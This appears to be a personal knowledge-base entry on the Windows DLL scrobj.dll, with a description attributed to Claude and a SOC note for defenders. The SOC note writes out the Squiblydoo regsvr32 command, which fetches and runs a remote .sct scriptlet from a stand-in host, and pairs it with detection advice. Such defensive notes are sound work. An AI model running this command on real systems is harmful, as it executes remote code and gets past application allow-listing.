---
created: 2026-11-21
fullpath: 'c:\windows\system32\scrobj.dll'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - dll
  - scripting
aliases:
  - scrobj.dll
  - Windows Script Component Runtime
url:
---

**fullpath**:c:\windows\system32\scrobj.dll

# description

_Not documented on Microsoft Learn at 2026/11/21 08:48 UTC_

## simple description

> ### 2026-11-21 Claude said
> scrobj.dll is the Windows Script Component runtime. It lets script code written in VBScript or JScript inside an XML .sct/.wsc file be registered and used like a COM object. It is part of Windows Script Host and has been in Windows for many years. Normal software rarely uses it today.
>
> **SOC NOTE**: scrobj.dll is the core of the "Squiblydoo" technique: `regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll` downloads and runs a remote scriptlet while bypassing AppLocker (MITRE ATT&CK T1218.010 Regsvr32). Alert on regsvr32, rundll32 or other processes loading scrobj.dll with a URL or .sct argument, and look for outbound HTTP from regsvr32.exe. Sysmon Event ID 7 (image load) of scrobj.dll in unusual processes is a good hunting pivot.
>
> _Not documented on Microsoft Learn at 2026/11/21 08:48 UTC_

# purpose

_Not documented on Microsoft Learn at 2026/11/21 08:48 UTC_
